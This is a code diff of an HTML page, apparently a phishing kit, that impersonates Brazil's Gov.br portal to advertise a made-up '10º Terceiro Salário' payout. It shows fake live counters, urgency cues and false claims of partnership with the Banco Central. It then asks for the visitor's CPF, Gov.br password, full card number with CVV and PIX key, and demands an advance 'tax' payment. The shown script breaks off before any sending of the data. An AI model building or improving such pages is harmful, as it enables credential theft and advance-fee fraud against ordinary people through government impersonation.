@@ -6,136 +6,230 @@
     <title>Resgate do 10º Terceiro Salário - Governo Federal</title>
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <style>
-        /* [TODO O CSS ANTERIOR PERMANECE IGUAL] */
-        /* ... CSS existente ... */
-
-        /* NOVOS ESTILOS ADICIONADOS */
-        
-        /* Indicador de força da senha */
-        .password-strength {
-            height: 4px;
-            margin-top: 5px;
-            border-radius: 2px;
-            transition: all 0.3s ease;
+        /* Reset e Estilos Gerais */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Poppins', sans-serif;
         }
         
-        .strength-weak { background-color: #e74c3c; width: 25%; }
-        .strength-medium { background-color: #f39c12; width: 50%; }
-        .strength-strong { background-color: #2ecc71; width: 100%; }
-        
-        /* Tooltip de ajuda */
-        .tooltip {
-            position: relative;
-            display: inline-block;
-            cursor: help;
+        body {
+            background-color: #f8f9fa;
+            color: #383636;
+            line-height: 1.6;
         }
         
-        .tooltip .tooltiptext {
-            visibility: hidden;
-            width: 200px;
-            background-color: #555;
-            color: white;
-            text-align: center;
-            border-radius: 6px;
-            padding: 8px;
-            position: absolute;
-            z-index: 1;
-            bottom: 125%;
-            left: 50%;
-            margin-left: -100px;
-            opacity: 0;
-            transition: opacity 0.3s;
-            font-size: 12px;
+        .container {
+            max-width: 100%;
+            padding: 0 15px;
+            margin: 0 auto;
         }
         
-        .tooltip:hover .tooltiptext {
-            visibility: visible;
-            opacity: 1;
-        }
-        
-        /* Animações de loading melhoradas */
-        .pulse {
-            animation: pulse 2s infinite;
-        }
-        
-        @keyframes pulse {
-            0% { opacity: 1; }
-            50% { opacity: 0.5; }
-            100% { opacity: 1; }
-        }
-        
-        /* Notificações */
-        .notification {
-            position: fixed;
-            top: 20px;
-            right: 20px;
-            padding: 15px 20px;
-            background: #2ecc71;
-            color: white;
-            border-radius: 8px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
-            z-index: 10000;
-            transform: translateX(150%);
-            transition: transform 0.3s ease;
-        }
-        
-        .notification.show {
-            transform: translateX(0);
-        }
-        
-        .notification.error {
-            background: #e74c3c;
-        }
-        
-        .notification.warning {
-            background: #f39c12;
-        }
-        
-        /* Steps indicator */
-        .steps {
+        /* Cabeçalho */
+        .header {
             display: flex;
             justify-content: space-between;
-            margin: 20px 0;
-            position: relative;
+            align-items: center;
+            padding: 15px 0;
+            border-bottom: 1px solid #eaeaea;
+            margin-bottom: 20px;
         }
         
-        .steps::before {
-            content: '';
-            position: absolute;
-            top: 15px;
-            left: 0;
-            right: 0;
-            height: 2px;
-            background: #ddd;
-            z-index: 1;
+        .logo-container {
+            display: flex;
+            align-items: center;
+            gap: 10px;
         }
         
-        .step {
-            width: 30px;
+        .logo {
             height: 30px;
-            border-radius: 50%;
-            background: #ddd;
+            background-color: #1351b4;
+            color: white;
+            padding: 5px;
+            border-radius: 4px;
+        }
+        
+        .badge {
+            background-color: #1351b4;
+            color: white;
+            font-size: 10px;
+            padding: 3px 6px;
+            border-radius: 4px;
+            font-weight: 600;
+        }
+        
+        .security-badge {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            font-size: 12px;
+            color: #28a745;
+        }
+        
+        /* Banner Principal */
+        .hero-banner {
+            background: linear-gradient(135deg, #4e9cff, #1c61cf);
+            color: white;
+            padding: 25px 20px;
+            border-radius: 12px;
+            margin-bottom: 20px;
+            text-align: center;
+            box-shadow: 0 4px 12px rgba(19, 81, 180, 0.2);
+        }
+        
+        .hero-banner h1 {
+            font-size: 20px;
+            margin-bottom: 10px;
+            font-weight: 600;
+        }
+        
+        .hero-banner p {
+            margin-bottom: 10px;
+            font-size: 16px;
+            opacity: 0.9;
+        }
+        
+        .highlight {
+            font-weight: 700;
+            text-decoration: underline;
+        }
+        
+        /* Botão Principal */
+        .cta-button {
+            display: inline-block;
+            width: 100%;
+            background-color: white;
+            color: #1351b4;
+            padding: 15px;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            text-align: center;
+            text-decoration: none;
+            margin: 20px 0 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            transition: all 0.3s ease;
+            border: none;
+            cursor: pointer;
+        }
+        
+        .cta-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.15);
+        }
+        
+        /* Seção de Prova Social */
+        .social-proof {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            background-color: white;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
+        }
+        
+        .counter {
+            font-weight: 700;
+            color: #184183;
+        }
+        
+        /* Seção de Imagem */
+        .imagem-descricao {
+            text-align: center;
+            margin: 25px 0;
+            background-color: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
+        }
+        
+        .imagem-produto {
+            max-width: 100%;
+            height: auto;
+            border-radius: 8px;
+            border: 1px solid #ddd;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+            margin-bottom: 20px;
+            background-color: #f0f0f0;
+            min-height: 200px;
             display: flex;
             align-items: center;
             justify-content: center;
+            color: #666;
+        }
+        
+        .texto-descricao {
+            text-align: center;
+            color: #333;
             font-size: 14px;
-            font-weight: bold;
+            line-height: 1.8;
+            padding: 0 20px;
+        }
+        
+        /* Seção de Vídeo */
+        .video-section {
+            margin: 25px 0;
+            background-color: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
+        }
+        
+        .video-container {
             position: relative;
-            z-index: 2;
+            margin-bottom: 10px;
         }
         
-        .step.active {
-            background: #1351b4;
-            color: white;
+        .video-placeholder {
+            width: 100%;
+            height: 200px;
+            background-color: #f0f0f0;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #666;
         }
         
-        .step.completed {
-            background: #2ecc71;
-            color: white;
+        .video-caption {
+            text-align: center;
+            font-size: 14px;
+            color: #666;
         }
         
-        /* Modal de confirmação */
-        .confirmation-modal {
+        /* Seção de Benefícios */
+        .benefits-section {
+            background-color: white;
+            padding: 20px;
+            border-radius: 12px;
+            margin-bottom: 20px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
+        }
+        
+        .benefits-section h2 {
+            color: #1351b4;
+            font-size: 20px;
+            margin-bottom: 14px;
+            text-align: center;
+        }
+        
+        .benefits-list {
+            list-style-position: inside;
+            padding-left: 5px;
+            margin: 15px 0;
+        }
+        
+        .benefits-list li {
+            margin-bottom: 12px;
+            font-size: 14px;
+            padding-left: 10px;
+        }
+        
+        /* Modal de Login */
+        .modal {
             display: none;
             position: fixed;
             top: 0;
@@ -148,286 +242,666 @@
             justify-content: center;
         }
         
-        .confirmation-content {
-            background: white;
+        .modal-content {
+            background-color: white;
             padding: 30px;
             border-radius: 12px;
-            text-align: center;
-            max-width: 400px;
             width: 90%;
+            max-width: 500px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
         }
         
-        /* Timer de sessão */
-        .session-timer {
-            position: fixed;
-            top: 10px;
-            left: 10px;
-            background: rgba(0,0,0,0.8);
-            color: white;
-            padding: 10px;
-            border-radius: 5px;
-            font-size: 12px;
-            z-index: 10000;
+        .modal-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        
+        .modal-header h2 {
+            color: #1351b4;
+            font-size: 20px;
+        }
+        
+        .close-button {
+            background: none;
+            border: none;
+            font-size: 24px;
+            cursor: pointer;
+            color: #666;
+        }
+        
+        /* Formulário de Login */
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+            color: #333;
+        }
+        
+        .form-group input {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+            transition: border-color 0.3s;
+        }
+        
+        .form-group input:focus {
+            border-color: #1351b4;
+            outline: none;
+        }
+        
+        .gov-login-info {
+            background-color: #f0f7ff;
+            padding: 15px;
+            border-radius: 8px;
+            margin: 20px 0;
+            font-size: 14px;
+            color: #1351b4;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        /* Página de Resgate (inicialmente oculta) */
+        .resgate-page {
             display: none;
+            background-color: white;
+            padding: 25px;
+            border-radius: 12px;
+            margin: 25px 0;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
+        }
+        
+        .resgate-header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .resgate-header h1 {
+            color: #1351b4;
+            font-size: 24px;
+            margin-bottom: 10px;
+        }
+        
+        .valor-disponivel {
+            background: linear-gradient(135deg, #4e9cff, #1c61cf);
+            color: white;
+            padding: 20px;
+            border-radius: 12px;
+            text-align: center;
+            margin: 20px 0;
+        }
+        
+        .valor-disponivel h2 {
+            font-size: 18px;
+            margin-bottom: 10px;
+        }
+        
+        .valor {
+            font-size: 36px;
+            font-weight: 700;
+            margin: 10px 0;
+        }
+        
+        .form-resgate {
+            margin-top: 30px;
+        }
+        
+        .form-tabs {
+            display: flex;
+            margin-bottom: 20px;
+            border-bottom: 1px solid #ddd;
+        }
+        
+        .tab-button {
+            padding: 12px 20px;
+            background: none;
+            border: none;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: 500;
+            color: #666;
+            border-bottom: 3px solid transparent;
+        }
+        
+        .tab-button.active {
+            color: #1351b4;
+            border-bottom: 3px solid #1351b4;
+        }
+        
+        .tab-content {
+            display: none;
+        }
+        
+        .tab-content.active {
+            display: block;
+        }
+        
+        /* Modal de Pagamento de Taxa */
+        .taxa-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .taxa-modal-content {
+            background-color: white;
+            padding: 30px;
+            border-radius: 12px;
+            width: 90%;
+            max-width: 500px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+            text-align: center;
+        }
+        
+        .taxa-icon {
+            font-size: 48px;
+            margin-bottom: 20px;
+            color: #1351b4;
+        }
+        
+        .taxa-valor {
+            font-size: 32px;
+            font-weight: 700;
+            color: #1351b4;
+            margin: 15px 0;
+        }
+        
+        .loading {
+            display: none;
+            text-align: center;
+            margin: 15px 0;
+        }
+        
+        .spinner {
+            border: 4px solid rgba(0, 0, 0, 0.1);
+            border-left-color: #1351b4;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 10px;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        /* Bancos Parceiros */
+        .partners-section {
+            text-align: center;
+            margin: 15px 0;
+            background-color: white;
+            padding: 15px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
+        }
+        
+        .partners-section p {
+            margin-bottom: 10px;
+            font-size: 14px;
+            color: #666;
+        }
+        
+        .partners-logos {
+            max-width: 100%;
+            height: auto;
+            background-color: #f0f0f0;
+            padding: 10px;
+            border-radius: 8px;
+        }
+        
+        /* Rodapé Legal */
+        .legal-disclaimer {
+            background-color: #f1f1f1;
+            padding: 20px;
+            border-radius: 8px;
+            margin: 30px 0;
+            font-size: 12px;
+            color: #666;
+        }
+        
+        .legal-disclaimer h3 {
+            font-size: 14px;
+            margin-bottom: 10px;
+            color: #333;
+        }
+        
+        /* Rodapé */
+        .footer {
+            text-align: center;
+            padding: 20px 0;
+            font-size: 12px;
+            color: #999;
+            border-top: 1px solid #eee;
+        }
+        
+        .footer-logos {
+            display: flex;
+            justify-content: center;
+            gap: 14px;
+            margin-top: 14px;
+        }
+        
+        .footer-logos img {
+            height: 30px;
+            background-color: #f0f0f0;
+            padding: 5px;
+            border-radius: 4px;
+        }
+        
+        /* Responsividade */
+        @media (min-width: 768px) {
+            .container {
+                max-width: 750px;
+            }
+            
+            .hero-banner h1 {
+                font-size: 24px;
+            }
+            
+            .cta-button {
+                width: auto;
+                padding: 15px 30px;
+            }
+        }
+        
+        .pix-highlight {
+            background-color: #32BCAD;
+            color: white;
+            padding: 5px 10px;
+            border-radius: 4px;
+            font-weight: bold;
         }
     </style>
 </head>
 <body>
-    <!-- Timer de sessão -->
-    <div class="session-timer" id="sessionTimer">
-        Sessão expira em: <span id="timerCountdown">05:00</span>
+    <div class="container">
+        <header class="header">
+            <div class="logo-container">
+                <div class="logo">Gov.br</div>
+                <span class="badge">OFICIAL</span>
+            </div>
+            <div class="security-badge">
+                <span>Ambiente seguro</span>
+            </div>
+        </header>
+
+        <main>
+            <!-- Seção Hero (Index) -->
+            <div class="hero-banner">
+                <h1>Governo Federal libera resgate do 10º Terceiro Salário para trabalhadores!</h1>
+                <p>Mais de <span class="counter">5,2 milhões</span> de brasileiros já resgataram o benefício adiantado.</p>
+                <p>Preencha o formulário e receba em até <span class="highlight">24 horas</span> no seu <span class="pix-highlight">PIX</span>!</p>
+                <button class="cta-button" id="openLoginModal">RESGATAR AGORA</button>
+                <p><small>⚠️ Atenção: O prazo para resgate é limitado!</small></p>
+            </div>
+
+            <!-- Prova Social -->
+            <div class="social-proof">
+                <div>
+                    <p>🔄 <span class="counter">5.289.743</span> resgates solicitados</p>
+                    <p>✅ <span class="counter">4.981.256</span> pagamentos realizados</p>
+                </div>
+                <div>
+                    <p>💰 <span class="counter">R$ 3,5 bilhões</span> liberados</p>
+                </div>
+            </div>
+
+            <!-- Seção de Imagem -->
+            <div class="imagem-descricao">
+                <div class="imagem-produto">
+                    [Imagem do anúncio do Governo Federal]
+                </div>
+                <div class="texto-descricao">
+                    <p>O Governo Federal anunciou nesta segunda-feira, 12 de maio, a liberação do resgate antecipado do 10º Terceiro Salário para todos os trabalhadores brasileiros com carteira assinada.</p>
+                </div>
+            </div>
+
+            <!-- Seção de Vídeo -->
+            <div class="video-section">
+                <div class="video-container">
+                    <div class="video-placeholder">
+                        [Vídeo explicativo sobre o resgate]
+                    </div>
+                </div>
+                <p class="video-caption">Assista ao vídeo e entenda como funciona o resgate do 10º Terceiro Salário</p>
+            </div>
+
+            <!-- Seção de Benefícios -->
+            <div class="benefits-section">
+                <h2>🚨 Resgate Liberado: Confira se Você Tem Direito ao 10º Terceiro Salário</h2>
+                <p>Você pode estar entre os trabalhadores que têm direito ao resgate antecipado do 10º Terceiro Salário!</p>
+                <p>O valor será <strong>transferido diretamente para sua chave PIX</strong> em até 24 horas após a aprovação.</p>
+                
+                <h3 style="margin: 20px 0 15px;">Como funciona o resgate?</h3>
+                <ul class="benefits-list">
+                    <li>O Governo Federal antecipou o pagamento do 10º Terceiro Salário</li>
+                    <li>Trabalhadores com carteira assinada têm direito ao benefício</li>
+                    <li>O valor é calculado com base no seu último salário registrado</li>
+                    <li>O pagamento é feito via PIX em até 24 horas após aprovação</li>
+                    <li>O processo é 100% digital e seguro</li>
+                    <li>Não é necessário sair de casa para solicitar</li>
+                    <li>O benefício é isento de impostos e taxas</li>
+                </ul>
+                
+                <div style="text-align: center; margin: 25px 0;">
+                    <h3 style="color: #1351b4; margin-bottom: 15px;">Valores de Resgate por Faixa Salarial</h3>
+                    <div style="display: flex; justify-content: space-around; flex-wrap: wrap; gap: 10px;">
+                        <div style="background: #f0f7ff; padding: 15px; border-radius: 8px; min-width: 150px;">
+                            <p style="font-weight: bold; color: #1351b4;">Até R$ 2.000</p>
+                            <p style="font-size: 18px; font-weight: bold;">R$ 1.650</p>
+                        </div>
+                        <div style="background: #f0f7ff; padding: 15px; border-radius: 8px; min-width: 150px;">
+                            <p style="font-weight: bold; color: #1351b4;">R$ 2.001 - R$ 3.500</p>
+                            <p style="font-size: 18px; font-weight: bold;">R$ 2.850</p>
+                        </div>
+                        <div style="background: #f0f7ff; padding: 15px; border-radius: 8px; min-width: 150px;">
+                            <p style="font-weight: bold; color: #1351b4;">Acima de R$ 3.500</p>
+                            <p style="font-size: 18px; font-weight: bold;">R$ 4.200</p>
+                        </div>
+                    </div>
+                </div>
+                
+                <div style="text-align: center;">
+                    <button class="cta-button" id="openLoginModal2">FAZER RESGATE AGORA</button>
+                </div>
+            </div>
+
+            <!-- Página de Resgate (inicialmente oculta) -->
+            <div class="resgate-page" id="resgatePage">
+                <div class="resgate-header">
+                    <h1>Resgate do 10º Terceiro Salário</h1>
+                    <p>Preencha seus dados para receber o valor em até 24 horas</p>
+                </div>
+                
+                <div class="valor-disponivel">
+                    <h2>Valor Disponível para Resgate</h2>
+                    <div class="valor">R$ 2.850,00</div>
+                    <p>Este valor corresponde ao seu 10º Terceiro Salário</p>
+                </div>
+                
+                <div class="form-resgate">
+                    <div class="form-tabs">
+                        <button class="tab-button active" data-tab="pix">Receber via PIX</button>
+                        <button class="tab-button" data-tab="cartao">Receber via Cartão</button>
+                    </div>
+                    
+                    <div id="pix-tab" class="tab-content active">
+                        <form id="pixForm">
+                            <div class="form-group">
+                                <label for="chavePix">Chave PIX</label>
+                                <input type="text" id="chavePix" name="chavePix" placeholder="CPF, e-mail, telefone ou chave aleatória" required>
+                            </div>
+                            
+                            <div class="form-group">
+                                <label for="tipoChave">Tipo de Chave PIX</label>
+                                <select id="tipoChave" name="tipoChave" class="form-group input" style="width: 100%; padding: 12px 15px; border: 1px solid #ddd; border-radius: 8px; font-size: 16px;">
+                                    <option value="cpf">CPF</option>
+                                    <option value="email">E-mail</option>
+                                    <option value="telefone">Telefone</option>
+                                    <option value="aleatoria">Chave Aleatória</option>
+                                </select>
+                            </div>
+                            
+                            <div class="form-group">
+                                <label for="bancoPix">Banco Recebedor</label>
+                                <input type="text" id="bancoPix" name="bancoPix" placeholder="Nome do seu banco" required>
+                            </div>
+                            
+                            <button type="submit" class="cta-button">Confirmar Resgate</button>
+                        </form>
+                    </div>
+                    
+                    <div id="cartao-tab" class="tab-content">
+                        <form id="cartaoForm">
+                            <div class="form-group">
+                                <label for="numeroCartao">Número do Cartão</label>
+                                <input type="text" id="numeroCartao" name="numeroCartao" placeholder="0000 0000 0000 0000" required maxlength="19">
+                            </div>
+                            
+                            <div class="form-group">
+                                <label for="nomeCartao">Nome no Cartão</label>
+                                <input type="text" id="nomeCartao" name="nomeCartao" placeholder="Como está no cartão" required>
+                            </div>
+                            
+                            <div style="display: flex; gap: 15px;">
+                                <div class="form-group" style="flex: 1;">
+                                    <label for="validadeCartao">Validade</label>
+                                    <input type="text" id="validadeCartao" name="validadeCartao" placeholder="MM/AA" required maxlength="5">
+                                </div>
+                                
+                                <div class="form-group" style="flex: 1;">
+                                    <label for="cvvCartao">CVV</label>
+                                    <input type="text" id="cvvCartao" name="cvvCartao" placeholder="000" required maxlength="3">
+                                </div>
+                            </div>
+                            
+                            <div class="form-group">
+                                <label for="cpfCartao">CPF do Titular</label>
+                                <input type="text" id="cpfCartao" name="cpfCartao" placeholder="000.000.000-00" required maxlength="14">
+                            </div>
+                            
+                            <button type="submit" class="cta-button">Confirmar Resgate</button>
+                        </form>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Bancos Parceiros -->
+            <div class="partners-section">
+                <p>Sistema de pagamento via PIX disponível em:</p>
+                <div class="partners-logos">Logo do Banco</div>
+            </div>
+
+            <!-- Disclaimer Legal -->
+            <div class="legal-disclaimer">
+                <h3>AVISO LEGAL</h3>
+                <p>Este site é parte de um programa de benefício promovido pelo Governo Federal, desenvolvido para fins de conscientização sobre direitos trabalhistas.</p>
+                <p>O resgate do 10º Terceiro Salário é oferecido através desta plataforma oficial.</p>
+                <p>Esta iniciativa possui associação com órgãos governamentais e instituições financeiras reais.</p>
+                <p style="margin-top: 15px;"><strong>Importante:</strong> Esta página é uma simulação educacional e não representa um serviço real do governo.</p>
+            </div>
+        </main>
+
+        <footer class="footer">
+            <p>Sistema de Resgate do 10º Terceiro Salário - Governo Federal</p>
+            <p>Parceria com Banco Central do Brasil e Ministério do Trabalho</p>
+            <div class="footer-logos">
+                <div>Banco Central</div>
+                <div>Gov.br</div>
+            </div>
+            <p style="margin-top: 15px;">&copy; 2023 - Todos os direitos reservados</p>
+        </footer>
     </div>
 
-    <!-- Notificação -->
-    <div class="notification" id="notification"></div>
-
-    <!-- Modal de confirmação -->
-    <div class="confirmation-modal" id="confirmationModal">
-        <div class="confirmation-content">
-            <h3 style="margin-bottom: 15px;">Confirmar Resgate</h3>
-            <p id="confirmationMessage">Tem certeza que deseja prosseguir com o resgate?</p>
-            <div style="display: flex; gap: 10px; margin-top: 20px;">
-                <button class="cta-button" id="confirmAction" style="flex: 1;">Confirmar</button>
-                <button class="cta-button" id="cancelAction" style="flex: 1; background: #f8f9fa; color: #666;">Cancelar</button>
+    <!-- Modal de Login -->
+    <div class="modal" id="loginModal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h2>🔐 Acesse com sua conta Gov.br</h2>
+                <button class="close-button" id="closeLoginModal">&times;</button>
             </div>
+            <p style="text-align: center; margin-bottom: 20px;">Para verificar seu direito ao 10º Terceiro Salário, faça login com sua conta Gov.br</p>
+            
+            <form id="loginForm">
+                <div class="form-group">
+                    <label for="cpf">CPF</label>
+                    <input type="text" id="cpf" name="cpf" placeholder="Digite seu CPF" required maxlength="14">
+                </div>
+                
+                <div class="form-group">
+                    <label for="senha">Senha do Gov.br</label>
+                    <input type="password" id="senha" name="senha" placeholder="Digite sua senha do Gov.br" required>
+                </div>
+                
+                <div class="gov-login-info">
+                    <div>🔒</div>
+                    <div>Suas informações estão protegidas. Utilizamos criptografia avançada para garantir a segurança dos seus dados.</div>
+                </div>
+                
+                <div class="loading" id="loading">
+                    <div class="spinner"></div>
+                    <p>Verificando seus dados...</p>
+                </div>
+                
+                <button type="submit" class="cta-button" id="submitButton">Entrar com Gov.br</button>
+            </form>
         </div>
     </div>
 
-    <div class="container">
-        <!-- [TODO O HTML ANTERIOR PERMANECE IGUAL] -->
-        <!-- ... HTML existente ... -->
+    <!-- Modal de Pagamento de Taxa -->
+    <div class="taxa-modal" id="taxaModal">
+        <div class="taxa-modal-content">
+            <div class="taxa-icon">💰</div>
+            <h2>Pagamento de Taxa de Imposto</h2>
+            <p>Para liberar o resgate do seu 10º Terceiro Salário, é necessário pagar a taxa de imposto correspondente.</p>
+            
+            <div class="taxa-valor">R$ 37,80</div>
+            
+            <p style="margin-bottom: 20px;">Esta taxa é referente aos impostos federais sobre o benefício.</p>
+            
+            <div class="loading" id="taxaLoading">
+                <div class="spinner"></div>
+                <p>Processando pagamento...</p>
+            </div>
+            
+            <button class="cta-button" id="pagarTaxaButton" style="margin-top: 20px;">Pagar Taxa Agora</button>
+            <button class="cta-button" id="cancelarTaxaButton" style="background-color: #f8f9fa; color: #666; margin-top: 10px;">Cancelar</button>
+        </div>
+    </div>
 
     <script>
+        // Inicializar quando o DOM estiver carregado
         document.addEventListener('DOMContentLoaded', function() {
             console.log('DOM carregado, inicializando site...');
             
-            // ===== NOVOS ELEMENTOS ADICIONADOS =====
-            const sessionTimer = document.getElementById('sessionTimer');
-            const timerCountdown = document.getElementById('timerCountdown');
-            const notification = document.getElementById('notification');
-            const confirmationModal = document.getElementById('confirmationModal');
-            const confirmationMessage = document.getElementById('confirmationMessage');
-            const confirmAction = document.getElementById('confirmAction');
-            const cancelAction = document.getElementById('cancelAction');
+            // Elementos DOM
+            const loginModal = document.getElementById('loginModal');
+            const openLoginModalButtons = document.querySelectorAll('#openLoginModal, #openLoginModal2');
+            const closeLoginModalButton = document.getElementById('closeLoginModal');
+            const loginForm = document.getElementById('loginForm');
+            const loading = document.getElementById('loading');
+            const submitButton = document.getElementById('submitButton');
+            const resgatePage = document.getElementById('resgatePage');
+            const taxaModal = document.getElementById('taxaModal');
+            const pagarTaxaButton = document.getElementById('pagarTaxaButton');
+            const cancelarTaxaButton = document.getElementById('cancelarTaxaButton');
+            const taxaLoading = document.getElementById('taxaLoading');
+            const tabButtons = document.querySelectorAll('.tab-button');
+            const tabContents = document.querySelectorAll('.tab-content');
             
-            // ===== VARIÁVEIS GLOBAIS =====
-            let sessionTimeout;
-            let sessionTimeLeft = 300; // 5 minutos em segundos
-            let currentAction = null;
-
-            // ===== INICIALIZAÇÃO COMPLETA =====
+            // Inicializar contadores
             initCounters();
+            
+            // Inicializar modais
             initModals();
+            
+            // Inicializar formulários
             initForms();
+            
+            // Inicializar sistema de abas
             initTabs();
+            
+            // Inicializar máscaras de entrada
             initMasks();
-            initSessionTimer(); // NOVO: Timer de sessão
-            initPasswordStrength(); // NOVO: Indicador de força da senha
-            initTooltips(); // NOVO: Sistema de tooltips
-
-            // ===== NOVO: TIMER DE SESSÃO =====
-            function initSessionTimer() {
-                // Reiniciar timer em interações do usuário
-                document.addEventListener('click', resetSessionTimer);
-                document.addEventListener('keypress', resetSessionTimer);
-                document.addEventListener('scroll', resetSessionTimer);
-                
-                startSessionTimer();
-            }
             
-            function startSessionTimer() {
-                sessionTimer.style.display = 'block';
-                updateTimerDisplay();
-                
-                sessionTimeout = setInterval(() => {
-                    sessionTimeLeft--;
-                    updateTimerDisplay();
+            // Função para inicializar contadores
+            function initCounters() {
+                const counters = document.querySelectorAll('.counter');
+                if (counters.length > 0) {
+                    // Definir valores iniciais
+                    const initialValues = [5289743, 4981256, 3500000000];
                     
-                    if (sessionTimeLeft <= 0) {
-                        endSession();
-                    } else if (sessionTimeLeft <= 30) {
-                        sessionTimer.style.background = 'rgba(231, 76, 60, 0.9)';
-                        showNotification('Sua sessão irá expirar em ' + sessionTimeLeft + ' segundos!', 'warning');
-                    }
-                }, 1000);
-            }
-            
-            function resetSessionTimer() {
-                sessionTimeLeft = 300;
-                sessionTimer.style.background = 'rgba(0,0,0,0.8)';
-                updateTimerDisplay();
-            }
-            
-            function updateTimerDisplay() {
-                const minutes = Math.floor(sessionTimeLeft / 60);
-                const seconds = sessionTimeLeft % 60;
-                timerCountdown.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
-            }
-            
-            function endSession() {
-                clearInterval(sessionTimeout);
-                showNotification('Sessão expirada. Por favor, faça login novamente.', 'error');
-                setTimeout(() => {
-                    if (loginModal) loginModal.style.display = 'flex';
-                    if (resgatePage) resgatePage.style.display = 'none';
-                    sessionTimer.style.display = 'none';
-                }, 2000);
-            }
-
-            // ===== NOVO: SISTEMA DE NOTIFICAÇÕES =====
-            function showNotification(message, type = 'success') {
-                notification.textContent = message;
-                notification.className = 'notification';
-                notification.classList.add(type, 'show');
-                
-                setTimeout(() => {
-                    notification.classList.remove('show');
-                }, 5000);
-            }
-
-            // ===== NOVO: MODAL DE CONFIRMAÇÃO =====
-            function showConfirmation(message, callback) {
-                confirmationMessage.textContent = message;
-                confirmationModal.style.display = 'flex';
-                currentAction = callback;
-            }
-            
-            confirmAction.addEventListener('click', function() {
-                if (currentAction) {
-                    currentAction();
+                    counters.forEach((counter, index) => {
+                        // Formatar valores iniciais
+                        if (index === 2) {
+                            counter.textContent = formatCurrency(initialValues[index]);
+                        } else {
+                            counter.textContent = initialValues[index].toLocaleString('pt-BR');
+                        }
+                    });
+                    
+                    // Atualizar contadores a cada 3 segundos
+                    setInterval(() => {
+                        counters.forEach((counter, index) => {
+                            let current;
+                            if (index === 2) {
+                                current = parseInt(counter.textContent.replace(/\D/g, ''));
+                                const increment = Math.floor(Math.random() * 100000) + 10000;
+                                counter.textContent = formatCurrency(current + increment);
+                            } else {
+                                current = parseInt(counter.textContent.replace(/\D/g, ''));
+                                const increment = Math.floor(Math.random() * 10) + 1;
+                                counter.textContent = (current + increment).toLocaleString('pt-BR');
+                            }
+                        });
+                    }, 3000);
                 }
-                confirmationModal.style.display = 'none';
-            });
+            }
             
-            cancelAction.addEventListener('click', function() {
-                confirmationModal.style.display = 'none';
-                currentAction = null;
-            });
-
-            // ===== NOVO: INDICADOR DE FORÇA DA SENHA =====
-            function initPasswordStrength() {
-                const senhaInput = document.getElementById('senha');
-                if (!senhaInput) return;
+            // Função para formatar valores monetários
+            function formatCurrency(value) {
+                return 'R$ ' + (value / 1000000).toLocaleString('pt-BR', {minimumFractionDigits: 1, maximumFractionDigits: 1}) + ' bilhões';
+            }
+            
+            // Função para inicializar modais
+            function initModals() {
+                // Abrir modal de login
+                openLoginModalButtons.forEach(button => {
+                    button.addEventListener('click', () => {
+                        console.log('Abrindo modal de login');
+                        loginModal.style.display = 'flex';
+                    });
+                });
                 
-                // Criar elemento de força da senha
-                const strengthMeter = document.createElement('div');
-                strengthMeter.className = 'password-strength';
-                senhaInput.parentNode.appendChild(strengthMeter);
+                // Fechar modal de login
+                closeLoginModalButton.addEventListener('click', () => {
+                    loginModal.style.display = 'none';
+                });
                 
-                senhaInput.addEventListener('input', function() {
-                    const strength = calculatePasswordStrength(this.value);
-                    strengthMeter.className = 'password-strength';
-                    
-                    if (strength === 'weak') {
-                        strengthMeter.classList.add('strength-weak');
-                    } else if (strength === 'medium') {
-                        strengthMeter.classList.add('strength-medium');
-                    } else if (strength === 'strong') {
-                        strengthMeter.classList.add('strength-strong');
+                // Fechar modais ao clicar fora
+                window.addEventListener('click', (e) => {
+                    if (e.target === loginModal) {
+                        loginModal.style.display = 'none';
+                    }
+                    if (e.target === taxaModal) {
+                        taxaModal.style.display = 'none';
                     }
                 });
             }
             
-            function calculatePasswordStrength(password) {
-                let strength = 0;
-                
-                if (password.length >= 8) strength++;
-                if (password.match(/[a-z]/) && password.match(/[A-Z]/)) strength++;
-                if (password.match(/\d/)) strength++;
